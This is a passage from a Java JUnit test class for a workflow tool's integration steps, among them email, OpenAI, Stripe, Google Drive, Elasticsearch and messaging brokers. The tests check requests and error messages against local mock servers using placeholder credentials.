        readEmail.setPassword("pw");
        return readEmail;
    }

    @Test
    public void testReadEmailReadsARealMailboxNewestFirstAndCanMarkAsReadSuccess() throws Exception {
        GreenMail server = new GreenMail(ServerSetupTest.SMTP_IMAP);
        server.start();
        try {
            server.setUser("ops@example.com", "ops", "pw");
            GreenMailUtil.sendTextEmail("ops@example.com", "a@example.com", "First", "One", ServerSetupTest.SMTP);
            GreenMailUtil.sendTextEmail("ops@example.com", "b@example.com", "Second", "Two", ServerSetupTest.SMTP);
            server.waitForIncomingEmail(5000, 2);

            ReadEmailAction readEmail = readEmail(server);
            readEmail.setMaxMessages("1");
            ActionResult newest = run(readEmail);
            Assert.assertEquals(newest.getErrorMsg(), StatusCode.SUCCESS, newest.getStatusCode());
            JsonNode message = mapper.readTree(newest.getOutput()).path(0);
            Assert.assertEquals("Second", message.path("subject").asText());
            Assert.assertEquals("b@example.com", message.path("from").asText());
            Assert.assertEquals("Two", message.path("text").asText().trim());
            Assert.assertEquals(1, newest.getOutputVariables().get("messageCount"));

            Assert.assertEquals("Reading alone marks nothing as read.", 1, run(readEmail).getOutputVariables().get("messageCount"));
            readEmail.setMaxMessages("10");
            readEmail.setMarkAsRead("true");
            Assert.assertEquals(2, run(readEmail).getOutputVariables().get("messageCount"));
            readEmail.setMarkAsRead("false");
            Assert.assertEquals(0, run(readEmail).getOutputVariables().get("messageCount"));
        } finally {
            server.stop();
        }
    }

    @Test
    public void testReadEmailDoesNotRemoveWhatSomeoneMarkedAsDeletedSuccess() throws Exception {
        GreenMail server = new GreenMail(ServerSetupTest.SMTP_IMAP);
        server.start();
        try {
            server.setUser("ops@example.com", "ops", "pw");
            GreenMailUtil.sendTextEmail("ops@example.com", "a@example.com", "Kept", "One", ServerSetupTest.SMTP);
            server.waitForIncomingEmail(5000, 1);
            Store store = Session.getInstance(new java.util.Properties()).getStore("imap");
            store.connect("localhost", server.getImap().getPort(), "ops", "pw");
            Folder inbox = store.getFolder("INBOX");
            inbox.open(Folder.READ_WRITE);
            inbox.getMessage(1).setFlag(Flags.Flag.DELETED, true);
            inbox.close(false);
            store.close();

            ReadEmailAction readEmail = readEmail(server);
            readEmail.setMarkAsRead("true");
            Assert.assertEquals(StatusCode.SUCCESS, run(readEmail).getStatusCode());
            Assert.assertEquals(1, server.getReceivedMessages().length);
        } finally {
            server.stop();
        }
    }

    @Test
    public void testReadEmailSaysWhatIsWrongFail() throws Exception {
        GreenMail server = new GreenMail(ServerSetupTest.SMTP_IMAP);
        server.start();
        try {
            server.setUser("ops@example.com", "ops", "pw");
            ReadEmailAction readEmail = readEmail(server);
            readEmail.setFolder("Nowhere");
            Assert.assertEquals("The mail server has no folder called \"Nowhere\".", run(readEmail).getErrorMsg());
            readEmail.setFolder("INBOX");
            readEmail.setPassword("wrong");
            Assert.assertEquals("The mail server did not accept the username and password.", run(readEmail).getErrorMsg());
        } finally {
            server.stop();
        }
        ReadEmailAction closed = new ReadEmailAction();
        closed.setHostname("localhost");
        closed.setPort("1");
        closed.setSecurity("none");
        closed.setUsername("ops");
        Assert.assertEquals("Could not connect to the mail server at localhost:1. Check the address, and that the service is running.", run(closed).getErrorMsg());
    }

    private OpenAIAction openAI() {
        OpenAIAction openAI = new OpenAIAction();
        openAI.setBaseUrl(baseUrl + "/v1/");
        openAI.setApiKey("sk-test");
        openAI.setModel("gpt-test");
        openAI.setUserInput("A\ttab and a \"quote\" from an earlier step");
        return openAI;
    }

    @Test
    public void testOpenAISendsValidJsonForAnyTextAndKeepsTheWholeAnswerAsOutputSuccess() throws IOException {
        answerBody = "{\"choices\":[{\"message\":{\"content\":\"Yes.\"}}]}";
        ActionResult result = run(openAI());
        Assert.assertEquals("/v1/chat/completions", path);
        Assert.assertEquals("Bearer sk-test", authorization);
        Assert.assertEquals("gpt-test", received.path("model").asText());
        Assert.assertEquals("A\ttab and a \"quote\" from an earlier step", received.path("messages").path(0).path("content").asText());
        Assert.assertEquals(answerBody, result.getOutput());
    }

    @Test
    public void testOpenAISendsNoKeyToAServerThatDoesNotAskForOneSuccess() throws IOException {
        OpenAIAction openAI = openAI();
        openAI.setApiKey(null);
        Assert.assertEquals(StatusCode.SUCCESS, run(openAI).getStatusCode());
        Assert.assertNull(authorization);
    }

    @Test
    public void testOpenAIDoesNotEvaluateTextFromAnEarlierStepTwiceSuccess() throws IOException {
        TaskExecution execution = new TaskExecution();
        execution.getParameters().put("text", new ExecutionParameter("text", "$executionId".getBytes(StandardCharsets.UTF_8), false));
        OpenAIAction openAI = openAI();
        openAI.setUserInput("$parameters.get(\"text\")");
        openAI.run(new TaskServiceImpl(), execution, new VariableExtractorUtil(new VelocityEngine()), null);
        Assert.assertEquals("$executionId", received.path("messages").path(0).path("content").asText());
    }

    @Test
    public void testOpenAIGivesTheReasonFromItsAnswerFail() throws IOException {
        answerStatus = 401;
        answerBody = "{\"error\":{\"message\":\"Incorrect API key provided.\",\"type\":\"invalid_request_error\"}}";
        Assert.assertEquals("OpenAI answered with status 401: Incorrect API key provided.", run(openAI()).getErrorMsg());
    }


    private void assertSucceeded(ActionResult result) {
        Assert.assertEquals(result.getErrorMsg(), StatusCode.SUCCESS, result.getStatusCode());
    }

    private void assertFailsWith(Action action, String reason) throws IOException {
        ActionResult result = run(action);
        Assert.assertEquals(StatusCode.FAILURE, result.getStatusCode());
        Assert.assertTrue(result.getErrorMsg(), result.getErrorMsg().contains(reason));
    }

    private String basicOf(String login) {
        return "Basic " + Base64.getEncoder().encodeToString(login.getBytes(StandardCharsets.UTF_8));
    }

    @Test
    public void testMailchimpFindsTheContactByTheHashOfItsLowercaseEmailSuccess() throws IOException {
        MailchimpAction mailchimp = new MailchimpAction();
        mailchimp.setBaseUrl(baseUrl);
        mailchimp.setApiKey("abc-us21");
        mailchimp.setAudienceId("list1");
        mailchimp.setEmail("Urist.McVankab@freddiesjokes.com");
        assertSucceeded(run(mailchimp));
        // This hash is the example in the documentation of Mailchimp.
        Assert.assertEquals("/3.0/lists/list1/members/62eeb292278cc15f5817cb78f7790b08", path);
        Assert.assertEquals("PUT", method);
        Assert.assertEquals("subscribed", received.path("status_if_new").asText());
        Assert.assertTrue("Someone who has left must not be subscribed again", received.path("status").isMissingNode());
        mailchimp.setOperation("unsubscribeContact");
        assertSucceeded(run(mailchimp));
        Assert.assertEquals("PATCH", method);
        Assert.assertEquals("unsubscribed", received.path("status").asText());
    }

    @Test
    public void testStripeSendsAFormAndRefundsAllUnlessToldAnAmountSuccess() throws IOException {
        StripeAction stripe = new StripeAction();
        stripe.setBaseUrl(baseUrl);
        stripe.setSecretKey("sk_test");
        stripe.setOperation("createPaymentLink");
        stripe.setPriceId("price_1");
        answerBody = "{\"url\":\"https://buy.stripe.com/x\"}";
        ActionResult link = run(stripe);
        Assert.assertEquals("line_items%5B0%5D%5Bprice%5D=price_1&line_items%5B0%5D%5Bquantity%5D=1", receivedText);
        Assert.assertEquals("https://buy.stripe.com/x", link.getOutputVariables().get("url"));
        stripe.setOperation("refundPayment");
        stripe.setPaymentId("pi_1");
        answerBody = "{\"id\":\"re_1\",\"status\":\"succeeded\"}";
        ActionResult refund = run(stripe);
        Assert.assertEquals("/v1/refunds", path);
        Assert.assertEquals("payment_intent=pi_1", receivedText);
        Assert.assertEquals("re_1", refund.getOutputVariables().get("refundId"));
        stripe.setAmount("ten");
        assertFailsWith(stripe, "smallest unit");
    }

    @Test
    public void testWooCommerceNoteIsOnlyForTheShopUnlessAskedForSuccess() throws IOException {
        WooCommerceAction shop = new WooCommerceAction();
        shop.setSiteUrl(baseUrl);
        shop.setConsumerKey("ck");
        shop.setConsumerSecret("cs");
        shop.setOperation("addOrderNote");
        shop.setOrderNumber("123");
        shop.setNote("Packed");
        assertSucceeded(run(shop));
        Assert.assertEquals("/wp-json/wc/v3/orders/123/notes", path);
        Assert.assertEquals(basicOf("ck:cs"), authorization);
        Assert.assertFalse(received.path("customer_note").asBoolean());
        shop.setOperation("setStock");
        shop.setProductId("8");
        shop.setStockQuantity("40");
        assertSucceeded(run(shop));
        Assert.assertEquals("/wp-json/wc/v3/products/8", path);
        Assert.assertEquals(40, received.path("stock_quantity").asInt());
        Assert.assertTrue(received.path("manage_stock").asBoolean());
    }

    @Test
    public void testFreshdeskCreatesATicketAndKeepsANotePrivateSuccess() throws IOException {
        FreshdeskAction freshdesk = new FreshdeskAction();
        freshdesk.setSiteUrl(baseUrl);
        freshdesk.setApiKey("key");
        freshdesk.setEmail("ada@example.com");
        freshdesk.setSubject("Printer");
        freshdesk.setTicketDescription("It is broken");
        answerBody = "{\"id\":35}";
        ActionResult ticket = run(freshdesk);
        Assert.assertEquals(basicOf("key:X"), authorization);
        Assert.assertEquals(2, received.path("status").asInt());
        Assert.assertEquals("35", ticket.getOutputVariables().get("ticketNumber"));
        freshdesk.setOperation("addNote");
        freshdesk.setTicketNumber("35");
        freshdesk.setComment("Ordered a part");
        assertSucceeded(run(freshdesk));
        Assert.assertEquals("/api/v2/tickets/35/notes", path);
        Assert.assertTrue(received.path("private").asBoolean());
        freshdesk.setOperation("solveTicket");
        assertSucceeded(run(freshdesk));
        Assert.assertEquals(4, received.path("status").asInt());
    }

    @Test
    public void testWhatsAppSendsAMessageAndATemplateSuccess() throws IOException {
        WhatsAppAction whatsApp = new WhatsAppAction();
        whatsApp.setBaseUrl(baseUrl);
        whatsApp.setToken("tok");
        whatsApp.setPhoneNumberId("106");
        whatsApp.setTo("+46 70 123 45 67");
        whatsApp.setMessage("Hello");
        answerBody = "{\"messages\":[{\"id\":\"wamid.1\"}]}";
        ActionResult sent = run(whatsApp);
        Assert.assertEquals("/v26.0/106/messages", path);
        Assert.assertEquals("46701234567", received.path("to").asText());
        Assert.assertEquals("whatsapp", received.path("messaging_product").asText());
        Assert.assertEquals("wamid.1", sent.getOutputVariables().get("messageId"));
        whatsApp.setOperation("sendTemplate");
        whatsApp.setTemplateName("hello_world");
        run(whatsApp);
        Assert.assertEquals("en_US", received.path("template").path("language").path("code").asText());
        Assert.assertEquals("deterministic", received.path("template").path("language").path("policy").asText());
        Assert.assertEquals("individual", received.path("recipient_type").asText());
        whatsApp.setTo("not a number");
        assertFailsWith(whatsApp, "country code");
    }

    @Test
    public void testClickUpSaysWhetherToNotifyEveryoneOfACommentSuccess() throws IOException {
        ClickUpAction clickUp = new ClickUpAction();
        clickUp.setBaseUrl(baseUrl);
        clickUp.setToken("pk_1");
        clickUp.setOperation("addComment");
        clickUp.setTaskId("86a");
        clickUp.setComment("Looking at it");
        assertSucceeded(run(clickUp));
        Assert.assertEquals("/api/v2/task/86a/comment", path);
        Assert.assertEquals("pk_1", authorization);
        Assert.assertFalse(received.path("notify_all").asBoolean(true));
    }

    private String googleKeyFile() throws Exception {
        return sheets().getServiceAccountKey();
    }

    @Test
    public void testGoogleDriveEscapesTheNameAndCreatesAFileInAFolderSuccess() throws Exception {
        GoogleDriveAction drive = new GoogleDriveAction();
        drive.setBaseUrl(baseUrl);
        drive.setServiceAccountKey(googleKeyFile());
        drive.setFileName("Ada's plan");
        answerBody = "{\"files\":[{\"id\":\"f1\"}]}";
        ActionResult found = run(drive);
        assertSucceeded(found);
        Assert.assertTrue(query, query.contains("name contains 'Ada\\'s plan'"));
        Assert.assertTrue(query, query.contains("supportsAllDrives=true"));
        Assert.assertEquals("Bearer goog", authorization);
        Assert.assertEquals(1, found.getOutputVariables().get("fileCount"));
        drive.setOperation("createTextFile");
        assertFailsWith(drive, "folder");
        drive.setFolderId("folder1");
        drive.setFileContent("Hello");
        answerBody = "{\"id\":\"f2\",\"webViewLink\":\"https://drive/f2\"}";
        ActionResult created = run(drive);
        assertSucceeded(created);
        Assert.assertEquals("/upload/drive/v3/files", path);
        Assert.assertTrue(requestHeaders.get("content-type"), requestHeaders.get("content-type").startsWith("multipart/related; boundary="));
        Assert.assertTrue(receivedText, receivedText.contains("\"parents\":[\"folder1\"]") && receivedText.contains("\r\n\r\nHello\r\n"));
        Assert.assertEquals("f2", created.getOutputVariables().get("fileId"));
    }

    @Test
    public void testGoogleCalendarCreatesAnEventAndRefusesATimeWithoutAZoneSuccess() throws Exception {
        GoogleCalendarAction calendar = new GoogleCalendarAction();
        calendar.setBaseUrl(baseUrl);
        calendar.setServiceAccountKey(googleKeyFile());
        calendar.setCalendar("team@example.com");
        calendar.setTitle("Standup");
        calendar.setStartTime("2026-12-01T09:00:00");
        calendar.setEndTime("2026-12-01T10:00:00+01:00");
        assertFailsWith(calendar, "time zone");
        calendar.setStartTime("2026-12-01T09:00:00+01:00");
        answerBody = "{\"id\":\"ev1\",\"htmlLink\":\"https://calendar/ev1\"}";
        ActionResult created = run(calendar);
        assertSucceeded(created);
        Assert.assertEquals("/calendar/v3/calendars/team%40example.com/events", rawPath);
        Assert.assertEquals("2026-12-01T09:00:00+01:00", received.path("start").path("dateTime").asText());
        Assert.assertEquals("ev1", created.getOutputVariables().get("eventId"));
    }

    @Test
    public void testMongoDBRefusesToChangeEverythingWithoutBeingToldFailure() throws IOException {
        MongoDBAction mongo = new MongoDBAction();
        mongo.setConnectionString("mongodb://localhost:1");
        mongo.setDatabase("shop");
        mongo.setCollection("orders");
        mongo.setOperation("deleteDocuments");
        assertFailsWith(mongo, "filter");
        mongo.setOperation("addDocument");
        assertFailsWith(mongo, "document");
    }

    @Test
    public void testDatadogPausesAMonitorThroughADowntimeSuccess() throws IOException {
        DatadogAction datadog = new DatadogAction();
        datadog.setBaseUrl(baseUrl);
        datadog.setApiKey("api");
        datadog.setApplicationKey("app");
        datadog.setOperation("pauseMonitor");
        datadog.setMonitorId("123");
        answerBody = "{\"data\":{\"id\":\"down-1\"}}";
        ActionResult result = run(datadog);
        assertSucceeded(result);
        Assert.assertEquals("/api/v2/downtime", path);
        Assert.assertEquals("app", requestHeaders.get("dd-application-key"));
        Assert.assertEquals(123, received.path("data").path("attributes").path("monitor_identifier").path("monitor_id").asInt());
        Assert.assertEquals("down-1", result.getOutputVariables().get("downtimeId"));
        datadog.setApplicationKey("");
        assertFailsWith(datadog, "application key");
    }

    @Test
    public void testSentryResolvesAnIssueSuccess() throws IOException {
        SentryAction sentry = new SentryAction();
        sentry.setBaseUrl(baseUrl);
        sentry.setToken("tok");
        sentry.setOrganization("acme");
        sentry.setOperation("resolveIssue");
        sentry.setIssueId("55");
        answerBody = "{\"status\":\"resolved\"}";
        ActionResult result = run(sentry);
        assertSucceeded(result);
        Assert.assertEquals("PUT", method);
        Assert.assertEquals("/api/0/organizations/acme/issues/55/", path);
        Assert.assertEquals("resolved", result.getOutputVariables().get("issueStatus"));
    }

    @Test
    public void testCloudflareOnlyPurgesEverythingWhenThatIsChosenSuccess() throws IOException {
        CloudflareAction cloudflare = new CloudflareAction();
        cloudflare.setBaseUrl(baseUrl);
        cloudflare.setToken("tok");
        cloudflare.setZoneId("zone");
        cloudflare.setOperation("purgeAddresses");
        assertFailsWith(cloudflare, "at least one address");
        cloudflare.setAddresses("https://example.com/a\n\nhttps://example.com/b");
        assertSucceeded(run(cloudflare));
        Assert.assertEquals("/client/v4/zones/zone/purge_cache", path);
        Assert.assertEquals(2, received.path("files").size());
        Assert.assertTrue(received.path("purge_everything").isMissingNode());
    }

    @Test
    public void testDigitalOceanRestartsADropletSuccess() throws IOException {
        DigitalOceanAction digitalOcean = new DigitalOceanAction();
        digitalOcean.setBaseUrl(baseUrl);
        digitalOcean.setToken("tok");
        digitalOcean.setOperation("rebootDroplet");
        digitalOcean.setDropletId("nope");
        assertFailsWith(digitalOcean, "droplet ID");
        digitalOcean.setDropletId("316");
        assertSucceeded(run(digitalOcean));
        Assert.assertEquals("/v2/droplets/316/actions", path);
        Assert.assertEquals("reboot", received.path("type").asText());
    }

    @Test
    public void testOktaSignsInWithItsOwnKindOfTokenSuccess() throws IOException {
        OktaAction okta = new OktaAction();
        okta.setSiteUrl(baseUrl);
        okta.setToken("tok");
        okta.setOperation("suspendUser");
        okta.setUserLogin("ada@example.com");
        assertSucceeded(run(okta));
        Assert.assertEquals("SSWS tok", authorization);
        Assert.assertEquals("/api/v1/users/ada@example.com/lifecycle/suspend", path);
    }

    @Test
    public void testGiteaOpensAPullRequestSuccess() throws IOException {
        GiteaAction gitea = new GiteaAction();
        gitea.setSiteUrl(baseUrl);
        gitea.setToken("tok");
        gitea.setOwner("acme");
        gitea.setRepository("shop");
        gitea.setOperation("createPullRequest");
        gitea.setTitle("Fix");
        assertFailsWith(gitea, "branch");
        gitea.setSourceBranch("fix");
        answerBody = "{\"number\":2,\"html_url\":\"https://git/pulls/2\"}";
        ActionResult result = run(gitea);
        assertSucceeded(result);
        Assert.assertEquals("/api/v1/repos/acme/shop/pulls", path);
        Assert.assertEquals("fix", received.path("head").asText());
        Assert.assertEquals("main", received.path("base").asText());
        Assert.assertEquals("2", result.getOutputVariables().get("number"));
    }

    @Test
    public void testBitbucketNamesBranchesTheWayItWantsSuccess() throws IOException {
        BitbucketAction bitbucket = new BitbucketAction();
        bitbucket.setBaseUrl(baseUrl);
        bitbucket.setEmail("a@b.se");
        bitbucket.setToken("tok");
        bitbucket.setWorkspace("acme");
        bitbucket.setRepository("shop");
        bitbucket.setOperation("createPullRequest");
        bitbucket.setTitle("Fix");
        bitbucket.setSourceBranch("fix");
        assertSucceeded(run(bitbucket));
        Assert.assertEquals("/2.0/repositories/acme/shop/pullrequests", path);
        Assert.assertEquals("fix", received.path("source").path("branch").path("name").asText());
        Assert.assertEquals(basicOf("a@b.se:tok"), authorization);
    }

    @Test
    public void testCircleCIStartsAPipelineSuccess() throws IOException {
        CircleCIAction circleCI = new CircleCIAction();
        circleCI.setBaseUrl(baseUrl);
        circleCI.setToken("tok");
        circleCI.setOperation("startPipeline");
        circleCI.setProjectSlug("gh/acme/shop");
        circleCI.setBranch("main");
        answerBody = "{\"id\":\"p1\",\"number\":25,\"state\":\"created\"}";
        ActionResult result = run(circleCI);
        assertSucceeded(result);
        Assert.assertEquals("/api/v2/project/gh/acme/shop/pipeline", path);
        Assert.assertEquals("tok", requestHeaders.get("circle-token"));
        Assert.assertEquals("p1", result.getOutputVariables().get("pipelineId"));
    }

    @Test
    public void testWordPressWritesADraftUnlessToldOtherwiseSuccess() throws IOException {
        WordPressAction wordPress = new WordPressAction();
        wordPress.setSiteUrl(baseUrl);
        wordPress.setUsername("admin");
        wordPress.setApplicationPassword("pass");
        wordPress.setOperation("createPost");
        wordPress.setTitle("Week 45");
        answerBody = "{\"id\":12,\"status\":\"draft\",\"link\":\"u\"}";
        ActionResult result = run(wordPress);
        assertSucceeded(result);
        Assert.assertEquals("/wp-json/wp/v2/posts", path);
        Assert.assertEquals("draft", received.path("status").asText());
        Assert.assertEquals(basicOf("admin:pass"), authorization);
        Assert.assertEquals("12", result.getOutputVariables().get("postId"));
    }

    @Test
    public void testBoxSharesAFileWithTheCompanyByDefaultSuccess() throws IOException {
        BoxAction box = new BoxAction();
        box.setBaseUrl(baseUrl);
        box.setToken("tok");
        box.setOperation("shareFile");
        box.setFileId("99");
        answerBody = "{\"shared_link\":{\"url\":\"https://box/s\"}}";
        ActionResult result = run(box);
        assertSucceeded(result);
        Assert.assertEquals("/2.0/files/99", path);
        Assert.assertEquals("company", received.path("shared_link").path("access").asText());
        Assert.assertEquals("https://box/s", result.getOutputVariables().get("url"));
    }

    @Test
    public void testOneDriveFindsTheDriveOfThePersonThenSavesSuccess() throws IOException {
        OneDriveAction oneDrive = new OneDriveAction();
        oneDrive.setBaseUrl(baseUrl);
        oneDrive.setSignInUrl(baseUrl);
        oneDrive.setTenantId("t");
        oneDrive.setClientId("c");
        oneDrive.setClientSecret("s");
        oneDrive.setPerson("ada@example.com");
        oneDrive.setOperation("saveTextFile");
        oneDrive.setFilePath("reports/week 45.txt");
        oneDrive.setFileContent("Hello");
        answersByRequest.put("/oauth2/v2.0/token", "{\"access_token\":\"signed-in\"}");
        answersByRequest.put("/v1.0/users/ada@example.com/drive", "{\"id\":\"d1\"}");
        answerBody = "{\"id\":\"f1\",\"webUrl\":\"u\"}";
        ActionResult result = run(oneDrive);
        assertSucceeded(result);
        Assert.assertEquals("/v1.0/drives/d1/items/root:/reports/week 45.txt:/content", path);
        Assert.assertEquals("Bearer signed-in", authorization);
        Assert.assertEquals("Hello", receivedText);
        Assert.assertEquals("f1", result.getOutputVariables().get("fileId"));
    }

    @Test
    public void testOutlookSendsFromTheMailboxSuccess() throws IOException {
        OutlookAction outlook = new OutlookAction();
        outlook.setBaseUrl(baseUrl);
        outlook.setSignInUrl(baseUrl);
        outlook.setOperation("sendEmail");
        outlook.setMailbox("ops@example.com");
        outlook.setToAddresses("ada@example.com, bo@example.com");
        outlook.setSubject("Hello");
        assertFailsWith(outlook, "app registration");
        outlook.setTenantId("t");
        outlook.setClientId("c");
        outlook.setClientSecret("s");
        answersByRequest.put("/oauth2/v2.0/token", "{\"access_token\":\"signed-in\"}");
        assertSucceeded(run(outlook));
        Assert.assertEquals("/v1.0/users/ops@example.com/sendMail", path);
        Assert.assertEquals(2, received.path("message").path("toRecipients").size());
        Assert.assertEquals("Text", received.path("message").path("body").path("contentType").asText());
    }

    @Test
    public void testSendGridSendsToEveryoneNamedSuccess() throws IOException {
        SendGridAction sendGrid = new SendGridAction();
        sendGrid.setBaseUrl(baseUrl);
        sendGrid.setApiKey("SG.x");
        sendGrid.setFromAddress("ops@example.com");
        sendGrid.setToAddresses("ada@example.com, bo@example.com");
        sendGrid.setSubject("Hello");
        sendGrid.setEmailBody("Text");
        assertSucceeded(run(sendGrid));
        Assert.assertEquals("/v3/mail/send", path);
        Assert.assertEquals(2, received.path("personalizations").path(0).path("to").size());
        Assert.assertEquals("text/plain", received.path("content").path(0).path("type").asText());
    }

    @Test
    public void testPayPalSignsInThenCreatesAnOrderSuccess() throws IOException {
        PayPalAction payPal = new PayPalAction();
        payPal.setBaseUrl(baseUrl);
        payPal.setClientId("c");
        payPal.setClientSecret("s");
        payPal.setOperation("createOrder");
        payPal.setAmount("lots");
        assertFailsWith(payPal, "amount");
        payPal.setAmount("19.90");
        answersByRequest.put("/v1/oauth2/token", "{\"access_token\":\"signed-in\"}");
        answerBody = "{\"id\":\"o1\",\"status\":\"CREATED\",\"links\":[{\"rel\":\"payer-action\",\"href\":\"https://pay\"}]}";
        ActionResult result = run(payPal);
        assertSucceeded(result);
        Assert.assertEquals("/v2/checkout/orders", path);
        Assert.assertEquals("Bearer signed-in", authorization);
        Assert.assertEquals("19.90", received.path("purchase_units").path(0).path("amount").path("value").asText());
        Assert.assertEquals("https://pay", result.getOutputVariables().get("approvalUrl"));
    }

    @Test
    public void testElasticsearchSearchesWithSortLimitAndCountsSuccess() throws IOException {
        ElasticsearchAction elasticsearch = new ElasticsearchAction();
        elasticsearch.setSiteUrl(baseUrl);
        elasticsearch.setIndexName("logs-*");
        elasticsearch.setUsername("elastic");
        elasticsearch.setPassword("secret");
        elasticsearch.setSortField("timestamp");
        elasticsearch.setMaxResults("5");
        elasticsearch.setGroupByField("service");
        answerBody = "{\"hits\":{\"total\":{\"value\":4}},\"aggregations\":{\"groups\":{\"buckets\":[{\"key\":\"fastapi\",\"doc_count\":3},{\"key\":\"nestjs\",\"doc_count\":1}]}}}";
        ActionResult result = run(elasticsearch);
        assertSucceeded(result);
        Assert.assertEquals("/logs-*/_search", path);
        Assert.assertEquals(basicOf("elastic:secret"), authorization);
        Assert.assertEquals(5, received.path("size").asInt());
        Assert.assertTrue(received.path("track_total_hits").asBoolean());
        Assert.assertEquals("desc", received.path("sort").path(0).path("timestamp").path("order").asText());
        Assert.assertEquals("service", received.path("aggs").path("groups").path("terms").path("field").asText());
        Assert.assertEquals(4L, result.getOutputVariables().get("hitCount"));
        Assert.assertEquals("fastapi: 3, nestjs: 1", result.getOutputVariables().get("groups"));
    }

    @Test
    public void testElasticsearchPrefersTheApiKeyAndUpdatesOnlyTheFieldsGivenSuccess() throws IOException {
        ElasticsearchAction elasticsearch = new ElasticsearchAction();
        elasticsearch.setSiteUrl(baseUrl);
        elasticsearch.setIndexName("orders");
        elasticsearch.setApiKey("key");
        elasticsearch.setUsername("elastic");
        elasticsearch.setOperation("updateDocument");
        elasticsearch.setDocument("{\"status\": \"done\"}");
        assertFailsWith(elasticsearch, "ID of the document");
        elasticsearch.setDocumentId("a1");
        assertSucceeded(run(elasticsearch));
        Assert.assertEquals("ApiKey key", authorization);
        Assert.assertEquals("/orders/_update/a1", path);
        Assert.assertEquals("done", received.path("doc").path("status").asText());
    }

    @Test
    public void testElasticsearchListsIndexesWithoutNeedingOneSuccess() throws IOException {
        ElasticsearchAction elasticsearch = new ElasticsearchAction();
        elasticsearch.setOperation("listIndexes");
        assertFailsWith(elasticsearch, "address of the cluster");
        elasticsearch.setSiteUrl(baseUrl);
        answerBody = "[{\"index\":\"orders\"},{\"index\":\"logs\"}]";
        ActionResult result = run(elasticsearch);
        assertSucceeded(result);
        Assert.assertEquals("/_cat/indices", path);
        Assert.assertEquals(2, result.getOutputVariables().get("indexCount"));
    }

    @Test
    public void testElasticsearchSaysWhyAQueryIsRefusedFailure() throws IOException {
        ElasticsearchAction elasticsearch = new ElasticsearchAction();
        elasticsearch.setSiteUrl(baseUrl);
        elasticsearch.setIndexName("orders");
        elasticsearch.setOperation("search");
        elasticsearch.setQuery("not json");
        assertFailsWith(elasticsearch, "JSON object");
        elasticsearch.setQuery("{\"nothing\": {}}");
        answerStatus = 400;
        answerBody = "{\"error\":{\"reason\":\"unknown query [nothing]\"}}";
        assertFailsWith(elasticsearch, "unknown query [nothing]");
        answerBody = "{\"error\":{\"reason\":\"all shards failed\",\"root_cause\":[{\"reason\":\"cannot sort on [message]\"}]}}";
        assertFailsWith(elasticsearch, "cannot sort on [message]");
        elasticsearch.setOperation("readDocument");
        elasticsearch.setDocumentId("none");
        answerStatus = 404;
        answerBody = "{\"found\":false}";
        assertFailsWith(elasticsearch, "no document \"none\" in orders");
    }

    @Test
    public void testPrometheusCountsWhatTheQueryFoundSuccess() throws IOException {
        PrometheusAction prometheus = new PrometheusAction();
        prometheus.setSiteUrl(baseUrl);
        prometheus.setOperation("runQuery");
        prometheus.setQuery("up == 0");
        answerBody = "{\"data\":{\"result\":[{},{}]}}";
        ActionResult result = run(prometheus);
        assertSucceeded(result);
        Assert.assertEquals("query=up == 0", query);
        Assert.assertEquals(2, result.getOutputVariables().get("resultCount"));
    }

    @Test
    public void testGrafanaMarksAnEventWithItsTagsSuccess() throws IOException {
        GrafanaAction grafana = new GrafanaAction();
        grafana.setSiteUrl(baseUrl);
        grafana.setToken("tok");
        grafana.setOperation("addAnnotation");
        grafana.setAnnotationText("Deployed");
        grafana.setAnnotationTags("deploy, shop");
        answerBody = "{\"id\":65}";
        ActionResult result = run(grafana);
        assertSucceeded(result);
        Assert.assertEquals("/api/annotations", path);
        Assert.assertEquals("shop", received.path("tags").path(1).asText());
        Assert.assertEquals("65", result.getOutputVariables().get("annotationId"));
    }

    @Test
    public void testMessageStepsSayWhatIsMissingFailure() throws IOException {
        KafkaAction kafka = new KafkaAction();
        assertFailsWith(kafka, "servers");
        kafka.setServers("localhost:1");
        kafka.setTopic("orders");
        kafka.setOperation("readMessages");
        assertFailsWith(kafka, "consumer group");
        kafka.setConsumerGroup("g");
        kafka.setMessageLimit("100000");
        assertFailsWith(kafka, "between 1 and");
        RabbitMQAction rabbit = new RabbitMQAction();
        assertFailsWith(rabbit, "hostname");
        rabbit.setHostname("localhost");
        assertFailsWith(rabbit, "routing key");
        MqttAction mqtt = new MqttAction();
        assertFailsWith(mqtt, "address of the broker");
        mqtt.setBrokerUrl("tcp://localhost:1");
        mqtt.setTopic("t");
        mqtt.setQuality("9");
        assertFailsWith(mqtt, "quality of service");
    }
}
